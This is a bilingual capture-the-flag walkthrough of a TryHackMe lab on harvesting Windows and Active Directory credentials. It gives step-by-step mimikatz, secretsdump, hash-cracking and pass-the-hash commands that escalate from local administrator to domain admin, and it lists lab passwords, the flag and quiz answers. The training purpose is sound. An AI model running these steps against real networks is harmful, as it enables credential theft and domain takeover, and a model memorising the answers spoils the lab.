# Intro to Credential Harvesting [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** MEDIUM.
* **Tipo / Type:** Premium (requiere suscripción).
* **Slug:** `introtocredentialharvesting`
* **Link:** https://tryhackme.com/room/introtocredentialharvesting
* **Fuente / Source:** [Jery0843/TryHackMe](https://github.com/Jery0843/TryHackMe)

---

## Solucionario de Tareas / Task Solutions

### Tiendas de Credenciales en Windows / Active Directory

- **LSASS Memory:** guarda hashes NTLM/LM, tickets Kerberos y a veces credenciales en texto plano. Con acceso SYSTEM se vuelca LSASS. *Herramienta:* mimikatz → `sekurlsa::logonpasswords`
- **SAM + SYSTEM Hives:** almacena hashes de contraseñas de usuarios locales, encriptados con una clave del hive SYSTEM. *Herramientas:* reg export, mimikatz → `lsadump::sam`
- **LSA Secrets** (bajo `HKLM\SECURITY\Policy\Secrets`): credenciales de dominio cacheadas, credenciales de servicio en texto plano y a veces passwords de RDP. *Herramienta:* secretsdump.py con credenciales de admin local.
- **DPAPI Vault:** secreto de apps (Wi-Fi, RDP, contraseñas de navegador) usando la master key del usuario. *Herramienta:* mimikatz → `vault::list` + `vault::cred /export`
- **NTDS.dit:** en Domain Controllers, la base de datos de AD con los hashes NTLM y claves Kerberos de cada cuenta de dominio. *Herramientas:* secretsdump.py → `-just-dc`, mimikatz → `lsadump::dcsync`

### Conexión al Objetivo

Credenciales de administrador local proporcionadas:
- Username: `Administrator`
- Password: `N3w34829DJdd?1`
- Target IP: `10.220.10.20`

Conexión RDP:
```bash
xfreerdp /u:Administrator /p:'N3w34829DJdd?1' /v:10.220.10.20
```

### Paso 1 - Volcado de LSASS Memory

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

Encontrados:
- `svc-app` → password `S3rv!c3A***!`
- `ElonTusk` web creds → password `MyTusksAreTha***`

### Paso 2 - Volcado de DPAPI Vault

```text
mimikatz # vault::list
mimikatz # vault::cred /export
```

Confirma los mismos dos secretos (svc-app + Gmail de ElonTusk).

### Paso 3 - Extraer SAM + SYSTEM Hives

PowerShell:
```powershell
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

mimikatz:
```text
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM
```

Dump de hashes de cuentas locales (Administrator, Guest, ElonTusk).

### Paso 4 - Credenciales de Dominio Cacheadas

```text
mimikatz # token::elevate
mimikatz # lsadump::cache
```

Se obtienen hashes MSCacheV2 para usuarios de dominio (`raoulduke`, `svc-app`, `Administrator`).

### Paso 5 - Secretsdump (Volcado Remoto)

Kali:
```bash
secretsdump.py WRK/Administrator:'N3w34829DJdd?1'@10.220.10.20 -output local_dump
```

Extrae hashes locales + logons de dominio cacheados.

Cracking del hash MSCache de **drgonzo** con John:
```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password revelada: `lasve***1`.

### Paso 6 - Volcado de NTDS.dit del DC

```bash
secretsdump.py TRYHACKME/drgonzo:'lasve***1'@10.220.10.10 -just-dc -output dc_dump
```

Se obtiene el dump de NTDS.dit, incluyendo el hash NTLM del Domain Administrator:
`d71ee9fb6a3f5****6bdc6c941f7a2903`

### Paso 7 - Pass-the-Hash al Domain Controller

```bash
psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :d71ee9fb6a3f5****6bdc6c941f7a2903
```

Shell como **NT AUTHORITY\SYSTEM** en el DC.

### Paso 8 - Flag Final

```cmd
cd C:\Users\Administrator\Desktop
type flag.txt
```

**Flag:** `THM{gotta_l0ve_**********_st0res}`

### Knowledge Check Q&A

- **¿Qué componente de Windows almacena credenciales NTLM y Kerberos activas en memoria?** → **LSASS**
- **¿Qué archivo en el directorio `C:\Windows\NTDS\` contiene la base de datos de AD?** → **ntds.dit**
- **¿Qué comando de Mimikatz exporta credenciales del DPAPI Vault?** → **vault::cred /export**

### Resumen

Encadenando las cinco tiendas de credenciales se pasa de **local Administrator** en un solo workstation → **Domain Admin** en el DC. Sin exploits, solo usando las credenciales que Windows ya tenía guardadas.

---

*Documentación para propósitos educativos y registro de CTF. Fuente: writeup público verificado.*
